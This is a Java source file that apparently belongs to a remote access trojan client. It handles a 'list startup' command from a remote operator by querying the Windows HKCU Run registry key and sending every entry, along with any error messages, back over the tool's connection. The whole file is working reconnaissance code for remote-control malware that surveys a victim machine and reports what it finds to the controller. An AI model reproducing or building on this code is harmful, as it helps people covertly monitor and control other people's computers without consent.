package com.redpois0n.packets.in;

import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.out.Header;


public class PacketLISTSTARTUP extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
				
				String line;
				
				while ((line = reader.readLine()) != null) {
					String[] args = line.trim().split("    ");
					PacketBuilder packet = new PacketBuilder(Header.REGISTRY_STARTUP);
					packet.add(args.length);
					for (String str : args) {
						packet.add(str);
					}
					Connection.addToSendQueue(packet);
				}
				reader.close();
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			PacketBuilder packet = new PacketBuilder(Header.REGISTRY_STARTUP, "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage());
			Connection.addToSendQueue(packet);
		}
	}

}
